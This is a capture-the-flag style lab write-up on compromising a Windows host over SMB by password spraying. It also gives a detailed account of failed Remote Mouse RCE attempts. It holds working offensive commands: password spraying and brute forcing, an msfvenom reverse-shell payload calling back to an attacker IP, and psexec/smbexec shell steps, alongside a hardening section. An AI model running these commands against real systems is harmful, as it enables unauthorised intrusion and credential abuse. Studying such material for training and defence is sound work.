# Chapter 13 - Public Exploits Lab 1 - Educational Writeup

## üéØ Target Information
- **IP Address**: 192.168.165.10
- **Hostname**: REMOTEMOUSE
- **OS**: Windows 10 Pro Build 15063
- **Domain**: remotemouse (workgroup)
- **Flag Location**: `C:\Users\offsec\Desktop\flag.txt`
- **Flag**: `OS{925248cfcfc9f1dec95a5c8fd2909638}`

---

## ‚ö° TL;DR - The Shortest Path (5 Minutes)

### Critical Lesson: Test Credentials BEFORE Complex Exploits

**The Winning Commands:**
```bash
# 1. Enumerate SMB shares (30 seconds)
smbclient -L //192.168.165.10 -N

# 2. List accessible directories (30 seconds)
smbclient //192.168.165.10/offsec -N -c "ls Desktop"
# Result: flag.txt found but ACCESS_DENIED on read

# 3. Password spray common credentials (2 minutes)
crackmapexec smb 192.168.165.10 -u offsec -p lab
# Result: [+] remotemouse\offsec:lab

# 4. Retrieve flag with valid credentials (30 seconds)
smbclient //192.168.165.10/offsec -U offsec%lab -c "get Desktop\\flag.txt"
```

**Total Time**: ~5 minutes
**Actual Time Spent**: 7+ hours (due to rabbit hole)

---

## üîë Key Lessons Learned

### 1. **Methodology Order Matters**
- ‚ùå **Wrong**: Found RCE vulnerability ‚Üí spent hours trying to exploit
- ‚úÖ **Right**: Enumerate access ‚Üí test credentials ‚Üí exploit if needed

### 2. **Simple Wins First**
- Password was literally `lab` (3 characters)
- No exploit needed - just credential spraying
- OSCP motto: "Try harder" doesn't mean "try more complex"

### 3. **Don't Chase Shiny Exploits**
- Remote Mouse RCE exists and works (confirmed via public PoCs)
- But environmental factors (locked screen) blocked execution
- Credentials were the intended path, not RCE

### 4. **Rabbit Holes Are Educational**
- 7 hours of failed exploitation taught SMB, Windows permissions, exploit modification
- Failure documentation reveals what NOT to do in exams
- Understanding why exploits fail is as valuable as making them work

### 5. **Always Test Null Sessions AND Authenticated Access**
- Null sessions: Could list files but not read flag
- Authenticated (offsec:lab): Could read everything
- Same share, different permissions based on user context

---

## üìã Recommended OSCP Methodology

### Phase 1: Initial Enumeration (10-15 minutes)
```bash
# Port scan
nmap -p- --min-rate 1000 192.168.165.10 -oA fullscan

# Service enumeration
nmap -sV -sC -p139,445,1978 192.168.165.10 -oA services
```

### Phase 2: SMB Enumeration (10-15 minutes)
```bash
# List shares
smbclient -L //192.168.165.10 -N

# Enumerate accessible shares
smbclient //192.168.165.10/offsec -N -c "recurse; ls"
smbclient //192.168.165.10/users -N -c "ls"

# Identify sensitive files
# Result: Desktop\flag.txt (38 bytes) - ACCESS_DENIED
```

### Phase 3: User Enumeration (5 minutes)
```bash
# Attempt RPC enumeration
rpcclient -U "" -N 192.168.165.10 -c "enumdomusers; quit"
# Result: NT_STATUS_ACCESS_DENIED (blocked)

# Fallback: Use known Windows defaults
# - Administrator (always exists)
# - Guest (always exists)
# - offsec (discovered via SMB share name)
```

### Phase 4: Credential Testing (5-10 minutes)
```bash
# Test default accounts with null passwords
crackmapexec smb 192.168.165.10 -u Guest -p ''
# Result: [+] remotemouse\Guest: (valid but same perms as null)

# Password spray with common passwords
cat > passwords.txt << EOF
password
Password1
offsec
admin
lab
EOF

crackmapexec smb 192.168.165.10 -u offsec -p passwords.txt
# Result: [+] remotemouse\offsec:lab ‚úÖ
```

### Phase 5: Authenticated Access (2 minutes)
```bash
# Verify share access with credentials
crackmapexec smb 192.168.165.10 -u offsec -p lab --shares
# Result: offsec share = READ,WRITE

# Retrieve flag
smbclient //192.168.165.10/offsec -U offsec%lab -c "get Desktop\\flag.txt"
# Result: Flag downloaded successfully
```

---

## ‚ùå Failed Attempts - Educational Value

### Attempt 1: Remote Mouse RCE (7+ hours wasted)

#### What We Tried
```bash
# 1. Metasploit module
use exploit/windows/misc/remote_mouse_rce
set RHOSTS 192.168.165.10
set payload windows/shell/reverse_tcp
exploit
# Result: Version check failed, ForceExploit bypass also failed

# 2. Python exploit (EDB-ID 46697)
python3 46697.py 192.168.165.10
# Result: Python 2/3 compatibility issues, version check failed

# 3. Modified Python exploit
python3 exploit_custom.py 192.168.165.10 "notepad"
# Result: Notepad opened (RCE confirmed!)

# 4. Command execution attempts
python3 exploit_custom.py 192.168.165.10 "cmd /c copy Desktop\\flag.txt C:\\Users\\Public\\Documents\\flag.txt"
# Result: No files created (Run dialog doesn't execute shell commands)
```

#### Why It Failed
**Root Cause**: Remote Mouse exploit simulates keyboard input to Windows Run dialog (Win+R)
- Run dialog launches **GUI applications only**
- Does NOT support shell commands (`cmd.exe`, `certutil`, batch files)
- No output redirection (`>`, `|`, etc.)
- **System appeared to be locked/screensaver active** - all keyboard input ignored

**Technical Details**:
```
Exploit Method: UDP keyboard/mouse simulation on port 1978
Execution Path: WIN key ‚Üí Type "cmd.exe" ‚Üí Enter ‚Üí Type commands
Actual Behavior: Commands sent but zero observable effects
Evidence: No files created, no network callbacks, no process artifacts
Conclusion: Target in locked state (keyboard input blocked)
```

#### What We Learned
1. **RCE ‚â† Command Shell**: Remote code execution doesn't always mean command-line access
2. **Environmental Dependencies**: Exploits may require specific system states (unlocked screen)
3. **Verification Testing**: Should have tested simple file creation early to confirm execution
4. **Tool Limitations**: Run dialog is NOT equivalent to cmd.exe or PowerShell

#### Commands That Failed
```bash
# Batch file execution
python3 exploit_custom.py 192.168.165.10 "C:\\Users\\offsec\\copyflag.bat"
# Files uploaded via SMB but never executed

# PowerShell scripts
python3 exploit_custom.py 192.168.165.10 "powershell -File read_flag.ps1"
# Scripts uploaded but not executed

# VBScript execution
python3 exploit_custom.py 192.168.165.10 "cscript C:\\Users\\offsec\\copyflag.vbs"
# No execution observed

# Msfvenom payloads
python3 exploit_custom.py 192.168.165.10 "C:\\Users\\offsec\\shell.exe"
# Reverse shell never connected (firewall + AV blocking)
```

---

### Attempt 2: Reverse/Bind Shells (1 hour wasted)

#### What We Tried
```bash
# Msfvenom stageless payloads
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.160 LPORT=443 -f exe > shell.exe

# Upload via SMB
smbclient //192.168.165.10/offsec -N -c "put shell.exe"

# Execute via Remote Mouse
python3 exploit_custom.py 192.168.165.10 "shell.exe"

# Listeners on multiple ports
nc -nlvp 443
sudo nc -nlvp 53
sudo nc -nlvp 80
```

#### Why It Failed
1. **Windows Firewall**: Blocking all outbound connections on non-standard ports
2. **Execution Context**: Run dialog may not execute unsigned EXEs
3. **Antivirus**: Possible Windows Defender quarantine of msfvenom payloads
4. **System State**: Locked screen preventing any execution

#### What We Learned
- Modern Windows defaults block network-based payloads
- Port 80/443/53 don't bypass egress filtering
- Stageless vs staged payloads doesn't matter if firewall blocks everything
- Need to verify execution environment before payload delivery

---

### Attempt 3: File Exfiltration via Scripts (2 hours wasted)

#### What We Tried
**Batch Files**:
```batch
# get_flag.bat
type Desktop\flag.txt > C:\Users\Public\Documents\flag.txt

# Uploaded and executed
smbclient //192.168.165.10/offsec -N -c "put get_flag.bat"
python3 exploit_custom.py 192.168.165.10 "get_flag.bat"
# Result: No output file created
```

**VBScript**:
```vbscript
' copyflag.vbs
Set fso = CreateObject("Scripting.FileSystemObject")
fso.CopyFile "C:\Users\offsec\Desktop\flag.txt", "C:\Users\Public\Documents\flag.txt"

# Execution via cscript
python3 exploit_custom.py 192.168.165.10 "cscript copyflag.vbs"
# Result: No output file created
```

**PowerShell**:
```powershell
# read_flag.ps1
$flag = Get-Content C:\Users\offsec\Desktop\flag.txt
Set-Content C:\Users\Public\Documents\flag.txt $flag

# Execution
python3 exploit_custom.py 192.168.165.10 "powershell -ExecutionPolicy Bypass -File read_flag.ps1"
# Result: No output file created
```

#### Why It Failed
**Run Dialog Execution Limitations**:
- Accepts script filenames but doesn't execute them in proper context
- No shell environment for batch files
- Script interpreters (cscript, powershell) don't run with arguments from Run dialog
- Even if executed, commands typing into wrong window (focus issues)

#### What We Learned
- Windows Run dialog ‚â† cmd.exe prompt
- Script execution requires proper execution context
- File I/O operations need command-line shell, not GUI launcher

---

### Attempt 4: Official Exploit PoC Testing (1 hour wasted)

#### What We Tried
```bash
# Clone official Podalirius exploit
git clone https://github.com/p0dalirius/RemoteMouse-3.008-Exploit.git

# Test with official implementation
python3 RemoteMouse-3.008-Exploit.py -t 192.168.165.10 -c "echo test > C:\\Users\\Public\\Documents\\test.txt"
# Result: No file created

# Verbose mode verification
python3 RemoteMouse-3.008-Exploit.py -t 192.168.165.10 -v -c "copy Desktop\\flag.txt C:\\Users\\Public\\Documents\\flag.txt"
# Result: Commands sent successfully (73 key presses), no observable effect
```

#### Why This Was Important
**Verified the issue was environmental, not technical**:
- ‚úÖ Official exploit implementation matches our custom version
- ‚úÖ Commands sent correctly (verified in verbose mode)
- ‚úÖ Service responds properly (accepts keyboard input)
- ‚ùå Zero observable effects (no files, processes, or changes)

**Conclusion**: Target machine locked/screensaver active (Podalirius documentation explicitly requires "unlocked machine")

#### What We Learned
- When custom exploits fail, verify with official PoCs
- Multiple failed implementations point to environmental issue, not code bugs
- Documentation matters: "Requires unlocked machine" was the clue we needed
- Sometimes the vulnerability exists but environment prevents exploitation

---

### Attempt 5: SMB Vulnerability Scanning (15 minutes wasted)

#### What We Tried
```bash
# MS17-010 (EternalBlue) check
nmap -p445 --script=smb-vuln-ms17-010 192.168.165.10
# Result: NOT VULNERABLE

# Additional SMB vulnerabilities
nmap -p445 --script=smb-vuln-ms08-067,smb-vuln-ms06-025 192.168.165.10
# Result: NOT VULNERABLE

# SMB signing check (for relay attacks)
nmap -p445 --script=smb-security-mode 192.168.165.10
# Result: Signing not required (but no relay vector available)
```

#### Why It Failed
- **Windows 10 Build 15063** (March 2017) - same month MS17-010 was patched
- Modern OS with updated security patches
- No SMB-level RCE vulnerabilities present

#### What We Learned
- Always check for known vulnerabilities early
- OS version indicates likely patch level
- Build date vs CVE disclosure date correlation matters
- Don't skip vulnerability scanning even if other vectors seem promising

---

### Attempt 6: RPC User Enumeration (Blocked)

#### What We Tried
```bash
# RPC null session enumeration
rpcclient -U "" -N 192.168.165.10 -c "enumdomusers; quit"
# Result: NT_STATUS_ACCESS_DENIED

# Enum4linux comprehensive scan
enum4linux -a 192.168.165.10
# Result: NT_STATUS_ACCESS_DENIED on user queries

# CrackMapExec user enumeration
crackmapexec smb 192.168.165.10 -u '' -p '' --users
# Result: Error enumerating domain users

# Nmap NSE user enumeration
nmap -p445 --script=smb-enum-users 192.168.165.10
# Result: No users returned
```

#### Why It Failed
**Security Configuration**:
- Null sessions allowed for **share enumeration** (can list files)
- Null sessions **blocked for user enumeration** (restricted access)
- Modern Windows security hardening (post-MS17-010 era)

#### What We Learned
- Different SMB operations have different permission requirements
- Null session ‚â† full anonymous access
- Fallback to Windows defaults: Administrator, Guest, username from share names
- User enumeration failure doesn't mean credential testing is impossible

---

## üîç The "But How Did You Know?" Section

### How to Find SMB Shares Without Tools
```bash
# Manual SMB connection
smbclient -L //192.168.165.10 -N
# -L: List shares
# -N: No password (null session)

# What to look for:
# - Share names (often match usernames)
# - Permissions (READ, WRITE)
# - Remarks (may contain hints)
```

### How to Identify Weak Passwords Manually
**Common OSCP/Lab Patterns**:
1. **Username = Password** (offsec:offsec, admin:admin)
2. **Simple words** (password, admin, welcome)
3. **Simple variations** (Password1, Welcome1, Admin123)
4. **Lab-specific** (lab, oscp, htb, vulnhub)
5. **Empty passwords** (null, blank)

**Manual Testing Method**:
```bash
# Test one by one
smbclient //192.168.165.10/offsec -U offsec%password
smbclient //192.168.165.10/offsec -U offsec%offsec
smbclient //192.168.165.10/offsec -U offsec%lab
# Look for: Error messages
# NT_STATUS_LOGON_FAILURE = wrong password
# No error + prompt = valid credentials
```

### How to Test Credentials Without CrackMapExec
```bash
# Method 1: smbclient direct connection
smbclient //192.168.165.10/offsec -U offsec%lab
# Success: You get smb: \> prompt
# Failure: NT_STATUS_LOGON_FAILURE error

# Method 2: smbmap
smbmap -H 192.168.165.10 -u offsec -p lab
# Shows: Share permissions with authenticated access

# Method 3: Impacket smbclient.py
impacket-smbclient offsec:lab@192.168.165.10
# Python implementation with more features
```

### How to Determine Required Privilege Level
```bash
# Test 1: Null session (anonymous)
smbclient //192.168.165.10/offsec -N -c "get Desktop\\flag.txt"
# Result: NT_STATUS_ACCESS_DENIED

# Test 2: Guest account (low privilege)
smbclient //192.168.165.10/offsec -U Guest% -c "get Desktop\\flag.txt"
# Result: NT_STATUS_ACCESS_DENIED

# Test 3: User account (offsec)
smbclient //192.168.165.10/offsec -U offsec%lab -c "get Desktop\\flag.txt"
# Result: SUCCESS - file downloaded

# Conclusion: Need user-level credentials (file owner or equivalent)
```

---

## üõ†Ô∏è Complete Tool Reference

### SMB Enumeration
```bash
# List shares (null session)
smbclient -L //TARGET -N
# -L: List mode
# -N: No password

# Connect to specific share
smbclient //TARGET/SHARE -N
# Interactive session for manual exploration

# Execute command and exit
smbclient //TARGET/SHARE -N -c "COMMAND"
# -c: Execute single command

# Recursive directory listing
smbclient //TARGET/SHARE -N -c "recurse; ls"
# recurse: Enable recursive mode
# ls: List all files and subdirectories

# Download files
smbclient //TARGET/SHARE -U user%pass -c "get path\\to\\file"
# Specify full path from share root
```

### Credential Testing
```bash
# CrackMapExec - Single credential
crackmapexec smb TARGET -u USERNAME -p PASSWORD
# [+] = valid credentials
# [-] = authentication failure

# CrackMapExec - Password spraying
crackmapexec smb TARGET -u users.txt -p passwords.txt
# Tests all combinations
# --continue-on-success: Don't stop at first match
# --no-bruteforce: Only test matching pairs (user1:pass1, user2:pass2)

# CrackMapExec - Share enumeration
crackmapexec smb TARGET -u USERNAME -p PASSWORD --shares
# Shows: Share names and permission levels

# Manual testing with smbclient
smbclient //TARGET/SHARE -U user%password
# Success: Gets interactive prompt
# Failure: Error message
```

### User Enumeration
```bash
# RPC enumeration (if allowed)
rpcclient -U "" -N TARGET
# Once connected:
#   enumdomusers - List domain users
#   queryuser RID - Get user details
#   querydispinfo - Display info enumeration

# Enum4linux (automated)
enum4linux -U TARGET
# -U: Users only
# -a: All enumeration (users, shares, groups, policies)

# Nmap NSE scripts
nmap -p445 --script=smb-enum-users TARGET
# Uses multiple enumeration techniques
```

### Vulnerability Scanning
```bash
# Specific CVE checks
nmap -p445 --script=smb-vuln-ms17-010 TARGET  # EternalBlue
nmap -p445 --script=smb-vuln-ms08-067 TARGET  # Conficker

# All SMB vulnerabilities
nmap -p445 --script=smb-vuln* TARGET
# Tests: MS17-010, MS08-067, CVE-2009-3103, etc.

# SMB security configuration
nmap -p445 --script=smb-security-mode TARGET
# Shows: Message signing, SMB version
```

---

## üéØ Alternative Attack Paths

### Path 1: Password Spraying (Used - 5 minutes)
```bash
crackmapexec smb 192.168.165.10 -u offsec -p lab
smbclient //192.168.165.10/offsec -U offsec%lab -c "get Desktop\\flag.txt"
```

### Path 2: Hydra Brute Force (15-30 minutes)
```bash
# If password wasn't in common list
hydra -l offsec -P /usr/share/wordlists/rockyou.txt smb://192.168.165.10
# -l: Single username
# -P: Password list
# -t 1: Single thread (avoid account lockout)
```

### Path 3: Impacket Tools (If credentials known)
```bash
# Using Impacket smbclient
impacket-smbclient offsec:lab@192.168.165.10
# Once connected: get Desktop/flag.txt

# Using Impacket smbexec (if admin creds)
impacket-smbexec offsec:lab@192.168.165.10
# Provides: Semi-interactive shell via SMB
```

### Path 4: PSExec (If admin credentials found)
```bash
# Metasploit psexec (requires admin)
use exploit/windows/smb/psexec
set RHOSTS 192.168.165.10
set SMBUser Administrator
set SMBPass <password>
exploit
# Gets: SYSTEM shell
```

---

## üõ°Ô∏è Defense & Remediation

### How to Prevent This Attack

#### 1. Strong Password Policy
```powershell
# Enforce complex passwords
net accounts /minpwlen:14 /maxpwage:60

# Disable weak passwords
# - No dictionary words
# - Minimum 12+ characters
# - Complexity requirements enabled
```

#### 2. Disable SMB Null Sessions
```powershell
# Registry settings
REG ADD "HKLM\System\CurrentControlSet\Control\LSA" /v restrictanonymous /t REG_DWORD /d 1 /f
REG ADD "HKLM\System\CurrentControlSet\Control\LSA" /v restrictanonymoussam /t REG_DWORD /d 1 /f
REG ADD "HKLM\System\CurrentControlSet\Control\LSA" /v everyoneincludesanonymous /t REG_DWORD /d 0 /f
```

#### 3. Account Lockout Policy
```powershell
# Prevent password spraying
net accounts /lockoutthreshold:5 /lockoutduration:30 /lockoutwindow:30
# Lockout after 5 failed attempts for 30 minutes
```

#### 4. Disable Guest Account
```powershell
net user Guest /active:no
# Removes null password access vector
```

#### 5. SMB Signing & Encryption
```powershell
# Require SMB signing
Set-SmbServerConfiguration -RequireSecuritySignature $true -Force

# Enable SMB encryption (SMB 3.0+)
Set-SmbServerConfiguration -EncryptData $true -Force
```

#### 6. Monitor for Password Spraying
```powershell
# Event IDs to monitor:
# 4625 - Failed logon
# 4771 - Kerberos pre-auth failed
# 4776 - NTLM authentication failed

# Detection: Multiple 4625 events from single source IP
```

---

## ‚è±Ô∏è Time Management for OSCP Exam

### Ideal Timeline (If done correctly)
- **0-5 min**: Port scan, service enumeration
- **5-10 min**: SMB share enumeration, file discovery
- **10-15 min**: User enumeration (or fallback to defaults)
- **15-20 min**: Password spraying with common lists
- **20-25 min**: Authenticated access, flag retrieval
- **Total**: 25 minutes

### Actual Timeline (With rabbit hole)
- **0-30 min**: Initial enumeration (correct)
- **30-60 min**: Discovered Remote Mouse RCE
- **1-7 hours**: Remote Mouse exploitation attempts (WRONG PATH)
- **7 hours**: Pivoted to credential testing
- **7h 5min**: Flag captured
- **Total**: 7+ hours

### Exam Lesson
- **Time-box complex exploits**: 30-60 minutes max
- **Test credentials early**: Before diving into exploits
- **Recognize dead ends**: If no observable results after multiple attempts, pivot
- **Document as you go**: Helps identify patterns and dead ends

---

## üìù Documentation Best Practices

### Real-Time Phase Documentation
```bash
# enumeration.md - Track all discovery
nmap -p- --min-rate 1000 192.168.165.10 -oA fullscan
# Document: All open ports, services, versions

# investigation_checklist.md - Track attack vectors
- [ ] SMB null session enumeration
- [ ] Credential testing (common passwords)
- [ ] Exploit research (searchsploit Remote Mouse)
- [ ] Vulnerability scanning (MS17-010, etc.)

# failed_attempts.md - Document what doesn't work
## Remote Mouse RCE Attempt
- Command: python3 exploit.py 192.168.165.10 "cmd /c copy flag"
- Expected: File copied to accessible location
- Actual: No observable effect
- Reason: Run dialog doesn't execute shell commands
- Lesson: Verify execution context before payload delivery
```

### Flag Capture Documentation
```bash
# breakthrough.md - The winning technique
## Password Spray Success
- Tool: CrackMapExec
- Wordlist: Custom (password, admin, lab, etc.)
- Result: offsec:lab
- Access Level: User (file owner)
- Flag Retrieval: smbclient authenticated session
```

---

## üéì OSCP Exam Relevance

### Skills Demonstrated
1. ‚úÖ **SMB Enumeration** - Null sessions, share access, file discovery
2. ‚úÖ **Credential Testing** - Password spraying, common password lists
3. ‚úÖ **User Enumeration** - RPC, fallback to defaults
4. ‚úÖ **Authenticated Access** - SMB file retrieval with credentials
5. ‚úÖ **Troubleshooting** - Recognizing dead ends, pivoting strategies

### Skills NOT Required (But Learned)
1. ‚ö†Ô∏è **Exploit Modification** - Python 2 to 3 conversion, custom payloads
2. ‚ö†Ô∏è **Protocol Analysis** - UDP packet crafting, Remote Mouse protocol
3. ‚ö†Ô∏è **Advanced Persistence** - Startup folder placement, scheduled tasks
4. ‚ö†Ô∏è **Firewall Evasion** - Testing multiple ports, protocol tunneling

### Exam Takeaways
- **Simple before complex**: Test credentials before writing custom exploits
- **Time management**: 7 hours on one box is exam failure
- **Recognize patterns**: ACCESS_DENIED on read ‚Üí need credentials
- **Document failures**: Knowing what doesn't work saves time
- **Environment matters**: Exploits may fail due to system state, not technique

---

## üîÑ What Would We Do Differently?

### Ideal Approach (In Hindsight)
1. **Enumerate SMB shares** (5 min)
   - Find flag location
   - Identify access restrictions

2. **Test credentials immediately** (10 min)
   - offsec:offsec, offsec:password, etc.
   - **offsec:lab** would be found in first batch

3. **Retrieve flag** (2 min)
   - Authenticated SMB access
   - Download Desktop\flag.txt

4. **Total time**: 17 minutes
   - vs 7+ hours actual

### Red Flags We Missed
- ‚úÖ RCE confirmed (notepad opened) but no further evidence
- ‚úÖ Multiple payload types all failed identically (pattern!)
- ‚úÖ No observable system changes after 10+ attempts
- ‚úÖ Official PoC also failed (environmental issue, not our code)
- ‚ùå **Should have pivoted to credentials after 1 hour max**

### What Went Right
- Thorough enumeration (found flag location quickly)
- Systematic testing (tried multiple exploit variations)
- Documentation (detailed failure analysis)
- Persistence (didn't give up after initial failures)

### What Went Wrong
- **Tunnel vision**: Focused on RCE instead of simpler vectors
- **Sunk cost fallacy**: "Spent 3 hours, must keep trying"
- **Skipped credential testing**: Assumed complex exploit was needed
- **Ignored patterns**: All attempts failing identically = environmental issue

---

## üèÜ Final Thoughts

### The Irony
After 7+ hours of:
- Custom exploit development
- Protocol analysis
- Payload modification
- Script execution techniques
- Firewall evasion attempts

**The answer was a 3-character password: `lab`**

### The Real Lesson
**OSCP is not about finding the most complex exploit.**

It's about:
- Systematic methodology
- Recognizing attack vectors
- Time management
- Knowing when to pivot

**"Try harder" means think smarter, not dig deeper into rabbit holes.**

### For Future Labs
```
1. Enumerate (10 min)
2. Test credentials (15 min)
3. If credentials fail: Research vulnerabilities (30 min)
4. If exploits fail repeatedly: PIVOT (don't waste 6+ hours)
5. Document everything (helps identify dead ends faster)
```

### Quote to Remember
> "The most elegant exploit is the one you don't have to write."
> - Every OSCP student after 7 hours of unnecessary work

---

## üìä Attack Chain Diagram

```
[Initial Scan] ‚Üí [SMB Enumeration] ‚Üí [Flag Located]
                                          ‚Üì
                                   [ACCESS_DENIED]
                                          ‚Üì
                        ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¥‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
                        ‚Üì                                   ‚Üì
              [WRONG: Remote Mouse RCE]          [RIGHT: Credential Testing]
                        ‚Üì                                   ‚Üì
              [7 hours of failure]                 [offsec:lab found]
                        ‚Üì                                   ‚Üì
              [Locked screen blocked]              [Authenticated SMB]
                        ‚Üì                                   ‚Üì
              [No observable results]                  [FLAG ‚úì]
```

---

## üìö References & Resources

### Exploits Researched
- **EDB-ID 46697**: Remote Mouse 3.008 - Unauthenticated RCE (Python)
- **EDB-ID 50047**: Remote Mouse 3.008 - Local Privilege Escalation
- **Podalirius GitHub**: https://github.com/p0dalirius/RemoteMouse-3.008-Exploit
- **Technical Writeup**: https://podalirius.net/en/articles/writing-an-exploit-for-remotemouse-3.008/

### SMB Resources
- **Impacket**: https://github.com/SecureAuthCorp/impacket
- **CrackMapExec**: https://github.com/byt3bl33d3r/CrackMapExec
- **Enum4linux**: https://github.com/CiscoCXSecurity/enum4linux

### Windows Security
- **MS17-010 (EternalBlue)**: CVE-2017-0144
- **SMB Hardening**: Microsoft Security Baseline
- **Password Policies**: CIS Windows 10 Benchmark

---

## ‚úÖ Checklist for Similar Scenarios

### When You Find a Flag But Can't Read It
- [ ] Test null session access
- [ ] Test Guest account access
- [ ] Enumerate users (RPC, enum4linux)
- [ ] **Password spray common credentials** ‚Üê DO THIS EARLY
- [ ] Research exploits (if credentials fail)
- [ ] Check for misconfigurations
- [ ] Verify share permissions with different users
- [ ] Test alternative access paths (C$, ADMIN$, IPC$)

### When Exploits Consistently Fail
- [ ] Verify exploit works (test on known vulnerable system)
- [ ] Check prerequisites (service version, OS compatibility)
- [ ] Test official PoCs (rule out custom code issues)
- [ ] Look for environmental blockers (firewall, AV, screen lock)
- [ ] Verify observable results (file creation, network traffic)
- [ ] **TIME-BOX ATTEMPTS** (30-60 min max)
- [ ] Document patterns (all fail the same way = environmental)
- [ ] **PIVOT to alternative vectors** (credentials, misconfigs)

---

**Date Completed**: October 5, 2025
**Time Spent**: 7+ hours (should have been 25 minutes)
**Lesson Learned**: Test credentials before complex exploits
**OSCP Readiness**: ‚ö†Ô∏è Methodology needs refinement (time management)
